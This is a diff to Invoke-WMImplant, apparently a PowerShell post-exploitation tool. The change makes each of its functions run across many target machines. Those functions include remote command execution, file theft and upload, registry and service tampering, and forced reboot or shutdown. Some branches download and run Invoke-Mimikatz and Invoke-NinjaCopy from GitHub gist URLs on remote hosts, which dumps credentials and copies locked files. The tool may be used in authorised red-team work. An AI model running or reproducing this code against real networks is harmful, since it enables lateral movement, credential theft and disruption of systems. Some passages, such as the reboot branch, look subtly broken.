@@ -1964,7 +1964,7 @@ function Invoke-WMImplant
         [string]$RemoteDrive,
         [Parameter(Mandatory = $False)]
         [string]$RemoteExtension,
-        [Parameter(Mandatory = $False)]
+        [Parameter(Mandatory = $False, ValueFromPipeLine=$True)]
         [string]$Target,
         [Parameter(Mandatory = $False)]
         [string]$Url,
@@ -2021,14 +2021,17 @@ function Invoke-WMImplant
                         Throw "You need to specify a file to read with the RemoteFile flag!"
                     }
 
-                    if($RemoteCredential)
+                    Foreach($Computer in $Target)
                     {
-                        Get-FileContentsWMImplant -Creds $RemoteCredential -Target $Target -File $RemoteFile
-                    }
+                        if($RemoteCredential)
+                        {
+                            Get-FileContentsWMImplant -Creds $RemoteCredential -Target $Computer -File $RemoteFile
+                        }
 
-                    else
-                    {
-                        Get-FileContentsWMImplant -Target $Target -File $RemoteFile
+                        else
+                        {
+                            Get-FileContentsWMImplant -Target $Computer -File $RemoteFile
+                        }
                     }
                 }
 
@@ -2049,14 +2052,17 @@ function Invoke-WMImplant
                         Throw "You need to specify the location to save the file with the $LocalFile flag!"
                     }
 
-                    if($RemoteCredential)
+                    Foreach($Computer in $Target)
                     {
-                        Invoke-FileTransferWMImplant -Creds $RemoteCredential -Download -DownloadFile $RemoteFile -DownloadFilePath $LocalFile -Target $Target
-                    }
+                        if($RemoteCredential)
+                        {
+                            Invoke-FileTransferWMImplant -Creds $RemoteCredential -Download -DownloadFile $RemoteFile -DownloadFilePath $LocalFile -Target $Computer
+                        }
 
-                    else
-                    {
-                        Invoke-FileTransferWMImplant -Download -DownloadFile $RemoteFile -DownloadFilePath $LocalFile -Target $Target
+                        else
+                        {
+                            Invoke-FileTransferWMImplant -Download -DownloadFile $RemoteFile -DownloadFilePath $LocalFile -Target $Computer
+                        }
                     }
                 }
 
@@ -2072,14 +2078,17 @@ function Invoke-WMImplant
                         Throw "Please provide the RemoteFile parameter to specify the directory to list!"
                     }
 
-                    if($RemoteCredential)
+                    Foreach($Computer in $Target)
                     {
-                        Invoke-LSWMImplant -Creds $RemoteCredential -Target $Target -Directory $RemoteFile
-                    }
+                        if($RemoteCredential)
+                        {
+                            Invoke-LSWMImplant -Creds $RemoteCredential -Target $Computer -Directory $RemoteFile
+                        }
 
-                    else
-                    {
-                        Invoke-LSWMImplant -Target $Target -Directory $RemoteFile
+                        else
+                        {
+                            Invoke-LSWMImplant -Target $Computer -Directory $RemoteFile
+                        }
                     }
                 }
 
@@ -2106,16 +2115,18 @@ function Invoke-WMImplant
                     $FullCommand += "$LocalFile"
                     $FullCommand +='"'
 
-                    if ($RemoteCredential)
+                    Foreach($Computer in $Target)
                     {
-                        Invoke-RemoteScriptWithOutput -Creds $RemoteCredential -Url https://gist.githubusercontent.com/ChrisTruncer/e7d629bddc354b5405d7dafbc4f64eff/raw/eb868bc462a560970fa167b324250ce9f257904e/Invoke-NinjaCopy.ps1 -Function $FullCommand -Target $Target
-                    }
+                        if ($RemoteCredential)
+                        {
+                            Invoke-RemoteScriptWithOutput -Creds $RemoteCredential -Url https://gist.githubusercontent.com/ChrisTruncer/e7d629bddc354b5405d7dafbc4f64eff/raw/eb868bc462a560970fa167b324250ce9f257904e/Invoke-NinjaCopy.ps1 -Function $FullCommand -Target $Computer
+                        }
 
-                    else
-                    {
-                        Invoke-RemoteScriptWithOutput -Url https://gist.githubusercontent.com/ChrisTruncer/e7d629bddc354b5405d7dafbc4f64eff/raw/eb868bc462a560970fa167b324250ce9f257904e/Invoke-NinjaCopy.ps1 -Function $FullCommand -Target $Target
+                        else
+                        {
+                            Invoke-RemoteScriptWithOutput -Url https://gist.githubusercontent.com/ChrisTruncer/e7d629bddc354b5405d7dafbc4f64eff/raw/eb868bc462a560970fa167b324250ce9f257904e/Invoke-NinjaCopy.ps1 -Function $FullCommand -Target $Computer
+                        }
                     }
-
                 }
 
                 "search"
@@ -2135,27 +2146,30 @@ function Invoke-WMImplant
                         Throw "Please provide the RemoteDrive parameter to specify the drive to search!"
                     }
 
-                    if($RemoteCredential)
+                    Foreach($Computer in $Target)
                     {
-                        if($RemoteFile)
+                        if($RemoteCredential)
                         {
-                            Find-FileWMImplant -Creds $RemoteCredential -File $RemoteFile -Target $Target -Drive $RemoteDrive
+                            if($RemoteFile)
+                            {
+                                Find-FileWMImplant -Creds $RemoteCredential -File $RemoteFile -Target $Computer -Drive $RemoteDrive
+                            }
+                            elseif($RemoteExtension)
+                            {
+                                Find-FileWMImplant -Creds $RemoteCredential -Extension $RemoteExtension -Target $Computer -Drive $RemoteDrive
+                            }
                         }
-                        elseif($RemoteExtension)
-                        {
-                            Find-FileWMImplant -Creds $RemoteCredential -Extension $RemoteExtension -Target $Target -Drive $RemoteDrive
-                        }
-                    }
 
-                    else
-                    {
-                        if($RemoteFile)
+                        else
                         {
-                            Find-FileWMImplant -File $RemoteFile -Target $Target -Drive $RemoteDrive
-                        }
-                        elseif($RemoteExtension)
-                        {
-                            Find-FileWMImplant -Extension $RemoteExtension -Target $Target -Drive $RemoteDrive
+                            if($RemoteFile)
+                            {
+                                Find-FileWMImplant -File $RemoteFile -Target $Computer -Drive $RemoteDrive
+                            }
+                            elseif($RemoteExtension)
+                            {
+                                Find-FileWMImplant -Extension $RemoteExtension -Target $Computer -Drive $RemoteDrive
+                            }
                         }
                     }
                 }
@@ -2182,14 +2196,17 @@ function Invoke-WMImplant
                         Throw "Please use the RemoteFile flag to specify the full path to upload the file to!"
                     }
 
-                    if($RemoteCredential)
+                    Foreach($Computer in $Target)
                     {
-                        Invoke-FileTransferWMImplant -Creds $RemoteCredential -Upload -UploadFile $LocalFile -UploadFilePath $RemoteFile -Target $Target -LocalUser $LocalUser -LocalPass $LocalPass
-                    }
+                        if($RemoteCredential)
+                        {
+                            Invoke-FileTransferWMImplant -Creds $RemoteCredential -Upload -UploadFile $LocalFile -UploadFilePath $RemoteFile -Target $Computer -LocalUser $LocalUser -LocalPass $LocalPass
+                        }
 
-                    else
-                    {
-                        Invoke-FileTransferWMImplant -Upload -UploadFile $LocalFile -UploadFilePath $RemoteFile -Target $Target -LocalUser $LocalUser -LocalPass $LocalPass
+                        else
+                        {
+                            Invoke-FileTransferWMImplant -Upload -UploadFile $LocalFile -UploadFilePath $RemoteFile -Target $Computer -LocalUser $LocalUser -LocalPass $LocalPass
+                        }
                     }
                 }
 
@@ -2205,14 +2222,17 @@ function Invoke-WMImplant
                         Throw "You need to specify the command to run with the -Command!"
                     }
 
-                    if($RemoteCredential)
+                    Foreach($Computer in $Target)
                     {
-                        Invoke-CommandExecution -Creds $RemoteCredential -ExecCommand $RemoteCommand -Target $Target
-                    }
+                        if($RemoteCredential)
+                        {
+                            Invoke-CommandExecution -Creds $RemoteCredential -ExecCommand $RemoteCommand -Target $Computer
+                        }
 
-                    else
-                    {
-                        Invoke-CommandExecution -Target $Target -ExecCommand $RemoteCommand
+                        else
+                        {
+                            Invoke-CommandExecution -Target $Computer -ExecCommand $RemoteCommand
+                        }
                     }
                 }
 
@@ -2247,25 +2267,31 @@ function Invoke-WMImplant
                     {
                         "create"
                         {
-                            if($RemoteCredential)
+                            Foreach($Computer in $Target)
                             {
-                                Invoke-RegValueMod -Target $Target -Creds $RemoteCredential -RegMethod create -RegHive $RegHive -RegKey $RegKey -RegValue $RegValue -RegData $RegData
-                            }
-                            else
-                            {
-                                Invoke-RegValueMod -Target $Target -RegMethod create -RegHive $RegHive -RegKey $RegKey -RegValue $RegValue -RegData $RegData
+                                if($RemoteCredential)
+                                {
+                                    Invoke-RegValueMod -Target $Computer -Creds $RemoteCredential -RegMethod create -RegHive $RegHive -RegKey $RegKey -RegValue $RegValue -RegData $RegData
+                                }
+                                else
+                                {
+                                    Invoke-RegValueMod -Target $Computer -RegMethod create -RegHive $RegHive -RegKey $RegKey -RegValue $RegValue -RegData $RegData
+                                }
                             }
                         }
 
                         "delete"
                         {
-                            if($RemoteCredential)
+                            Foreach($Computer in $Target)
                             {
-                                Invoke-RegValueMod -Target $Target -Creds $RemoteCredential -RegMethod delete -RegHive $RegHive -RegKey $RegKey -RegValue $RegValue
-                            }
-                            else
-                            {
-                                Invoke-RegValueMod -Target $Target -RegMethod delete -RegHive $RegHive -RegKey $RegKey -RegValue $RegValue
+                                if($RemoteCredential)
+                                {
+                                    Invoke-RegValueMod -Target $Computer -Creds $RemoteCredential -RegMethod delete -RegHive $RegHive -RegKey $RegKey -RegValue $RegValue
+                                }
+                                else
+                                {
+                                    Invoke-RegValueMod -Target $Computer -RegMethod delete -RegHive $RegHive -RegKey $RegKey -RegValue $RegValue
+                                }
                             }
                         }
                     }
@@ -2288,14 +2314,17 @@ function Invoke-WMImplant
                         Throw "You need to specify the Function flag to provide the function to run on the remote system!"
                     }
 
-                    if($RemoteCredential)
+                    Foreach($Computer in $Target)
                     {
-                        Invoke-RemoteScriptWithOutput -Creds $RemoteCredential -Url $Url -Function $Function -Target $Target
-                    }
+                        if($RemoteCredential)
+                        {
+                            Invoke-RemoteScriptWithOutput -Creds $RemoteCredential -Url $Url -Function $Function -Target $Computer
+                        }
 
-                    else
-                    {
-                        Invoke-RemoteScriptWithOutput -Url $Url -Function $Function -Target $Target
+                        else
+                        {
+                            Invoke-RemoteScriptWithOutput -Url $Url -Function $Function -Target $Computer
+                        }
                     }
                 }
 
@@ -2315,13 +2344,16 @@ function Invoke-WMImplant
                     {
                         "list"
                         {
-                            if($RemoteCredential)
+                            Foreach($Computer in $Target)
                             {
-                                Invoke-JobMod -Target $Target -Creds $RemoteCredential -JobAction list
-                            }
-                            else
-                            {
-                                Invoke-JobMod -Target $Target -JobAction list
+                                if($RemoteCredential)
+                                {
+                                    Invoke-JobMod -Target $Computer -Creds $RemoteCredential -JobAction list
+                                }
+                                else
+                                {
+                                    Invoke-JobMod -Target $Computer -JobAction list
+                                }
                             }
                         }
 
@@ -2332,13 +2364,16 @@ function Invoke-WMImplant
                                 Throw "You need to specify the job ID to delete with the -RemoteID flag"
                             }
 
-                            if($RemoteCredential)
+                            Foreach($Computer in $Target)
                             {
-                                Invoke-JobMod -Target $Target -Creds $RemoteCredential -JobAction delete -JobId $RemoteID
-                            }
-                            else
-                            {
-                                Invoke-JobMod -Target $Target -JobAction delete -JobId $RemoteID
+                                if($RemoteCredential)
+                                {
+                                    Invoke-JobMod -Target $Computer -Creds $RemoteCredential -JobAction delete -JobId $RemoteID
+                                }
+                                else
+                                {
+                                    Invoke-JobMod -Target $Computer -JobAction delete -JobId $RemoteID
+                                }
                             }
                         }
 
@@ -2354,13 +2389,16 @@ function Invoke-WMImplant
                                 Throw "You need to use -Time to specify when your job will run"
                             }
 
-                            if($RemoteCredential)
+                            Foreach($Computer in $Target)
                             {
-                                Invoke-JobMod -Target $Target -Creds $RemoteCredential -JobAction create -JobProcess $RemoteFile -Time $Time
-                            }
-                            else
-                            {
-                                Invoke-JobMod -Target $Target -JobAction create -JobProcess $RemoteFile -Time $Time
+                                if($RemoteCredential)
+                                {
+                                    Invoke-JobMod -Target $Computer -Creds $RemoteCredential -JobAction create -JobProcess $RemoteFile -Time $Time
+                                }
+                                else
+                                {
+                                    Invoke-JobMod -Target $Computer -JobAction create -JobProcess $RemoteFile -Time $Time
+                                }
                             }
                         }
                     }
@@ -2387,13 +2425,16 @@ function Invoke-WMImplant
                                 Throw "You need to specify the service name you want to start!"
                             }
 
-                            if($RemoteCredential)
+                            Foreach($Computer in $Target)
                             {
-                                Invoke-ServiceMod -Creds $RemoteCredential -Target $Target -Service $ServiceName -Start
-                            }
-                            else
-                            {
-                                Invoke-ServiceMod -Target $Target -Service $ServiceName -Start
+                                if($RemoteCredential)
+                                {
+                                    Invoke-ServiceMod -Creds $RemoteCredential -Target $Computer -Service $ServiceName -Start
+                                }
+                                else
+                                {
+                                    Invoke-ServiceMod -Target $Computer -Service $ServiceName -Start
+                                }
                             }
                         }
 
@@ -2404,13 +2445,16 @@ function Invoke-WMImplant
                                 Throw "You need to specify the service name you want to stop!"
                             }
 
-                            if($RemoteCredential)
+                            Foreach($Computer in $Target)
                             {
-                                Invoke-ServiceMod -Creds $RemoteCredential -Target $Target -Service $ServiceName -Stop
-                            }
-                            else
-                            {
-                                Invoke-ServiceMod -Target $Target -Service $ServiceName -Stop
+                                if($RemoteCredential)
+                                {
+                                    Invoke-ServiceMod -Creds $RemoteCredential -Target $Computer -Service $ServiceName -Stop
+                                }
+                                else
+                                {
+                                    Invoke-ServiceMod -Target $Computer -Service $ServiceName -Stop
+                                }
                             }
                         }
 
@@ -2421,13 +2465,16 @@ function Invoke-WMImplant
                                 Throw "You need to specify the service name you want to delete!"
                             }
 
-                            if($RemoteCredential)
+                            Foreach($Computer in $Target)
                             {
-                                Invoke-ServiceMod -Creds $RemoteCredential -Target $Target -Service $ServiceName -Delete
-                            }
-                            else
-                            {
-                                Invoke-ServiceMod -Target $Target -Service $ServiceName -Delete
+                                if($RemoteCredential)
+                                {
+                                    Invoke-ServiceMod -Creds $RemoteCredential -Target $Computer -Service $ServiceName -Delete
+                                }
+                                else
+                                {
+                                    Invoke-ServiceMod -Target $Computer -Service $ServiceName -Delete
+                                }
                             }
                         }
 
@@ -2443,15 +2490,17 @@ function Invoke-WMImplant
                                 Throw "You need to specify the path to the service binary for the service you are creating!"
                             }
 
-                            if($RemoteCredential)
+                            Foreach($Computer in $Target)
                             {
-                                Invoke-ServiceMod -Creds $RemoteCredential -Target $Target -NewServiceName $ServiceName -NewServicePath $RemoteFile -Create
+                                if($RemoteCredential)
+                                {
+                                    Invoke-ServiceMod -Creds $RemoteCredential -Target $Computer -NewServiceName $ServiceName -NewServicePath $RemoteFile -Create
+                                }
+                                else
+                                {
+                                    Invoke-ServiceMod -Target $Computer -NewServiceName $ServiceName -NewServicePath $RemoteFile -Create
+                                }
                             }
-                            else
-                            {
-                                Invoke-ServiceMod -Target $Target -NewServiceName $ServiceName -NewServicePath $RemoteFile -Create
-                            }
-
                         }
                     }
                 }
@@ -2463,16 +2512,18 @@ function Invoke-WMImplant
                         Throw "You need to provide a target to run the command against!"
                     }
 
-                    if($RemoteCredential)
+                    Foreach($Computer in $Target)
                     {
-                        Invoke-RemoteScriptWithOutput -Creds $RemoteCredential -Url https://gist.githubusercontent.com/ChrisTruncer/5cf37e859372f135219daa4b699eb587/raw/f6517e07463427c8f9e418e8ca5dd4afbcaf9654/gistfile1.txt -Function Invoke-Mimikatz -Target $Target
-                    }
+                        if($RemoteCredential)
+                        {
+                            Invoke-RemoteScriptWithOutput -Creds $RemoteCredential -Url https://gist.githubusercontent.com/ChrisTruncer/5cf37e859372f135219daa4b699eb587/raw/f6517e07463427c8f9e418e8ca5dd4afbcaf9654/gistfile1.txt -Function Invoke-Mimikatz -Target $Computer
+                        }
 
-                    else
-                    {
-                        Invoke-RemoteScriptWithOutput -Url https://gist.githubusercontent.com/ChrisTruncer/5cf37e859372f135219daa4b699eb587/raw/f6517e07463427c8f9e418e8ca5dd4afbcaf9654/gistfile1.txt -Function Invoke-Mimikatz -Target $Target
-                    }
-                }
+                        else
+                        {
+                            Invoke-RemoteScriptWithOutput -Url https://gist.githubusercontent.com/ChrisTruncer/5cf37e859372f135219daa4b699eb587/raw/f6517e07463427c8f9e418e8ca5dd4afbcaf9654/gistfile1.txt -Function Invoke-Mimikatz -Target $Computer
+                        }
+                }   }
 
                 "ps"
                 {
@@ -2481,14 +2532,17 @@ function Invoke-WMImplant
                         Throw "You need to specify a target to run the command against!"
                     }
 
-                    if($RemoteCredential)
+                    Foreach($Computer in $Target)
                     {
-                        Get-ProcessListingWMImplant -Creds $RemoteCredential -Target $Target
-                    }
+                        if($RemoteCredential)
+                        {
+                            Get-ProcessListingWMImplant -Creds $RemoteCredential -Target $Computer
+                        }
 
-                    else
-                    {
-                        Get-ProcessListingWMImplant -Target $Target
+                        else
+                        {
+                            Get-ProcessListingWMImplant -Target $Computer
+                        }
                     }
                 }
 
@@ -2504,29 +2558,33 @@ function Invoke-WMImplant
                         Throw "Please provide the ProcessID or ProcessName flag to specify the process to kill!"
                     }
 
-                    if($RemoteCredential)
+                    Foreach($Computer in $Target)
                     {
-                        if($ProcessName)
+
+                        if($RemoteCredential)
                         {
-                            Invoke-ProcessPunisher -Creds $RemoteCredential -Target $Target -PName $ProcessName
+                            if($ProcessName)
+                            {
+                                Invoke-ProcessPunisher -Creds $RemoteCredential -Target $Computer -PName $ProcessName
+                            }
+
+                            elseif($ProcessID)
+                            {
+                                Invoke-ProcessPunisher -Creds $RemoteCredential -Target $Computer -ProcId $ProcessID
+                            }
                         }
 
-                        elseif($ProcessID)
+                        else
                         {
-                            Invoke-ProcessPunisher -Creds $RemoteCredential -Target $Target -ProcId $ProcessID
-                        }
-                    }
+                            if($ProcessName)
+                            {
+                                Invoke-ProcessPunisher -Target $Computer -PName $ProcessName
+                            }
 
-                    else
-                    {
-                        if($ProcessName)
-                        {
-                            Invoke-ProcessPunisher -Target $Target -PName $ProcessName
-                        }
-
-                        elseif($ProcessID)
-                        {
-                            Invoke-ProcessPunisher -Target $Target -ProcId $ProcessID
+                            elseif($ProcessID)
+                            {
+                                Invoke-ProcessPunisher -Target $Computer -ProcId $ProcessID
+                            }
                         }
                     }
                 }
@@ -2543,14 +2601,17 @@ function Invoke-WMImplant
                         Throw "You need to specify the RemoteFile flag to provide a file/command to run!"
                     }
 
-                    if($RemoteCredential)
+                    Foreach($Computer in $Target)
                     {
-                        Invoke-ProcSpawn -Creds $RemoteCredential -Target $Target -Command $RemoteFile
-                    }
+                        if($RemoteCredential)
+                        {
+                            Invoke-ProcSpawn -Creds $RemoteCredential -Target $Computer -Command $RemoteFile
+                        }
 
-                    else
-                    {
-                        Invoke-ProcSpawn -Target $Target -Command $RemoteFile
+                        else
+                        {
+                            Invoke-ProcSpawn -Target $Computer -Command $RemoteFile
+                        }
                     }
                 }
 
@@ -2561,14 +2622,17 @@ function Invoke-WMImplant
                         Throw "You need to specify a target to run the command against!"
                     }
 
-                    if($RemoteCredential)
+                    Foreach($Computer in $Target)
                     {
-                        Find-CurrentUsers -Creds $RemoteCredential -Target $Target
-                    }
+                        if($RemoteCredential)
+                        {
+                            Find-CurrentUsers -Creds $RemoteCredential -Target $Computer
+                        }
 
-                    else
-                    {
-                        Find-CurrentUsers -Target $Target
+                        else
+                        {
+                            Find-CurrentUsers -Target $Computer
+                        }
                     }
                 }
 
@@ -2579,14 +2643,17 @@ function Invoke-WMImplant
                         Throw "You need to specify a target to run the command against!"
                     }
 
-                    if($RemoteCredential)
+                    Foreach($Computer in $Target)
                     {
-                        Get-ComputerDrives -Creds $RemoteCredential -Target $Target
-                    }
+                        if($RemoteCredential)
+                        {
+                            Get-ComputerDrives -Creds $RemoteCredential -Target $Computer
+                        }
 
-                    else
-                    {
-                        Get-ComputerDrives -Target $Target
+                        else
+                        {
+                            Get-ComputerDrives -Target $Computer
+                        }
                     }
                 }
 
@@ -2597,14 +2664,17 @@ function Invoke-WMImplant
                         Throw "You need to specify a target to run the command against!"
                     }
 
-                    if($RemoteCredential)
+                    Foreach($Computer in $Target)
                     {
-                        Get-NetworkCards -Creds $RemoteCredential -Target $Target
-                    }
+                        if($RemoteCredential)
+                        {
+                            Get-NetworkCards -Creds $RemoteCredential -Target $Computer
+                        }
 
-                    else
-                    {
-                        Get-NetworkCards -Target $Target
+                        else
+                        {
+                            Get-NetworkCards -Target $Computer
+                        }
                     }
                 }
 
@@ -2615,14 +2685,17 @@ function Invoke-WMImplant
                         Throw "You need to specify a target to run the command against!"
                     }
 
-                    if($RemoteCredential)
+                    Foreach($Computer in $Target)
                     {
-                        Get-InstalledPrograms -Creds $RemoteCredential -Target $Target
-                    }
+                        if($RemoteCredential)
+                        {
+                            Get-InstalledPrograms -Creds $RemoteCredential -Target $Computer
+                        }
 
-                    else
-                    {
-                        Get-InstalledPrograms -Target $Target
+                        else
+                        {
+                            Get-InstalledPrograms -Target $Computer
+                        }
                     }
                 }
 
@@ -2633,14 +2706,17 @@ function Invoke-WMImplant
                         Throw "You need to specify a target to run the command against!"
                     }
 
-                    if($RemoteCredential)
+                    Foreach($Computer in $Target)
                     {
-                        Find-VacantComputer -Creds $RemoteCredential -Target $Target
-                    }
+                        if($RemoteCredential)
+                        {
+                            Find-VacantComputer -Creds $RemoteCredential -Target $Computer
+                        }
 
-                    else
-                    {
-                        Find-VacantComputer -Target $Target
+                        else
+                        {
+                            Find-VacantComputer -Target $Computer
+                        }
                     }
                 }
 
@@ -2651,29 +2727,32 @@ function Invoke-WMImplant
                         Throw "You need to specify a target to run the command against!"
                     }
 
-                    if($LocalFile)
+                    Foreach($Computer in $Target)
                     {
-                        if($RemoteCredential)
+                        if($LocalFile)
                         {
-                            Get-WMIEventLogins -Creds $RemoteCredential -Target $Target -FileName $LocalFile
+                            if($RemoteCredential)
+                            {
+                                Get-WMIEventLogins -Creds $RemoteCredential -Target $Computer -FileName $LocalFile
+                            }
+
+                            else
+                            {
+                                Get-WMIEventLogins -Target $Computer -FileName $LocalFile
+                            }
                         }
 
                         else
                         {
-                            Get-WMIEventLogins -Target $Target -FileName $LocalFile
-                        }
-                    }
+                            if($RemoteCredential)
+                            {
+                                Get-WMIEventLogins -Creds $RemoteCredential -Target $Computer
+                            }
 
-                    else
-                    {
-                        if($RemoteCredential)
-                        {
-                            Get-WMIEventLogins -Creds $RemoteCredential -Target $Target
-                        }
-
-                        else
-                        {
-                            Get-WMIEventLogins -Target $Target
+                            else
+                            {
+                                Get-WMIEventLogins -Target $Computer
+                            }
                         }
                     }
                 }
@@ -2685,14 +2764,17 @@ function Invoke-WMImplant
                         Throw "You need to specify a target to run the command against!"
                     }
 
-                    if($RemoteCredential)
+                    Foreach($Computer in $Target)
                     {
-                        Invoke-PowerOptionsWMI -Creds $RemoteCredential -Target $Target -Logoff
-                    }
+                        if($RemoteCredential)
+                        {
+                            Invoke-PowerOptionsWMI -Creds $RemoteCredential -Target $Computer -Logoff
+                        }
 
-                    else
-                    {
-                        Invoke-PowerOptionsWMI -Target $Target -Logoff
+                        else
+                        {
+                            Invoke-PowerOptionsWMI -Target $Computer -Logoff
+                        }
                     }
                 }
 
@@ -2703,14 +2785,17 @@ function Invoke-WMImplant
                         Throw "You need to specify a target to run the command against!"
                     }
 
-                    if($RemoteCredential)
+                    Foreach($Computer in $Target)
                     {
-                        Invoke-PowerOptionsWMI -Creds $RemoteCredential -Target $Target -Reboot
-                    }
+                        if($RemoteCredential)
+                        {
+                            Invoke-PowerOptionsWMI -Creds $RemoteCredential -Target $Computer -Reboot
+                        }
 
-                    else
-                    {
-                        Find-VacantComputer -Target $Target -Reboot
+                        else
+                        {
+                            Find-VacantComputer -Target $Computer -Reboot
+                        }
                     }
                 }
 
@@ -2721,14 +2806,17 @@ function Invoke-WMImplant
                         Throw "You need to specify a target to run the command against!"
                     }
 
-                    if($RemoteCredential)
+                    Foreach($Computer in $Target)
                     {
-                        Invoke-PowerOptionsWMI -Creds $RemoteCredential -Target $Target -Shutdown
-                    }
+                        if($RemoteCredential)
+                        {
+                            Invoke-PowerOptionsWMI -Creds $RemoteCredential -Target $Computer -Shutdown
+                        }
 
-                    else
-                    {
-                        Find-VacantComputer -Target $Target -Shutdown
+                        else
+                        {
+                            Find-VacantComputer -Target $Computer -Shutdown
+                        }
                     }
                 }
 
